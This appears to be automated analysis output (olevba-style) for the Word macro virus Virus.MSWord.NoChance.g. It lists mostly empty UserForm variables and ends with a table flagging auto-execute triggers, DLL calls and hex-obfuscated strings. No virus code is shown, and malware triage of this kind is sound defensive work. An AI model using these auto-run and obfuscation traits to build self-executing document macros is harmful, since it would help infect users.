VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ScrollBar1'" IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton3'" IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton4'" IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton5'" IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton6'" IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox1'" IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ScrollBar1'" IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'Tous les mod\xe8les actifs'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox2'" IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton3'" IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton4'" IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton5'" IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton6'" IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton7'" IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox1'" IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |ScrollBar1_Change   |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

